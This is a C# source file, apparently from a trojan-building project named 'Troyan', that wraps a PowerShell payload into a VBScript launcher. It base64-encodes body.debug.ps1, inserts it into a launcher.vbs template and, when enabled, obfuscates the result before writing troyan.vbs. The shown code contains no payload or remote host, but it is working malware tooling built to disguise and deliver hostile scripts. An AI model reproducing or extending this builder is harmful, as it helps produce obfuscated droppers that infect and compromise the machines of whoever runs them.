using Commons;
using Microsoft.Extensions.Options;

namespace Troyan.Core;

/// <summary>Writes <c>nonobfuscated.vbs</c> (raw) then final <c>troyan.vbs</c> (obfuscated when <see cref="TroyanObfuscationOptions.Vbs"/> is true).</summary>
public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
{
    private readonly ITroyanVbsObfuscator _obfuscator;
    private readonly TroyanObfuscationOptions _obfuscation;

    public TroyanPlainVbsEmitter(ITroyanVbsObfuscator obfuscator, IOptions<TroyanObfuscationOptions> obfuscation)
    {
        _obfuscator = obfuscator;
        _obfuscation = obfuscation.Value;
    }

    public void Write(ServerLayoutPaths layout)
    {
        var templatePath = Path.Combine(layout.TroyanVbsDir, "launcher.vbs");
        if (!File.Exists(templatePath))
            throw new FileNotFoundException("launcher.vbs not found for plain VBS.", templatePath);

        var bodyPs1 = layout.BodyPs1Debug;
        if (!File.Exists(bodyPs1))
            throw new FileNotFoundException("body.debug.ps1 must be built before plain VBS.", bodyPs1);

        var b64 = Convert.ToBase64String(File.ReadAllBytes(bodyPs1));
        var template = File.ReadAllText(templatePath);
        const string placeholder = "0102";
        if (!template.Contains(placeholder, StringComparison.Ordinal))
            throw new InvalidOperationException("launcher.vbs must contain the 0102 placeholder.");

        var plain = template.Replace(placeholder, b64, StringComparison.Ordinal);
        var final = _obfuscation.Vbs ? _obfuscator.Obfuscate(plain) : plain;

        var dir = Path.GetDirectoryName(layout.TroyanOutputVbs);
        if (!string.IsNullOrEmpty(dir))
            Directory.CreateDirectory(dir);

        File.WriteAllText(layout.TroyanOutputVbsNonObfuscated, plain);
        File.WriteAllText(layout.TroyanOutputVbs, final);
    }
}
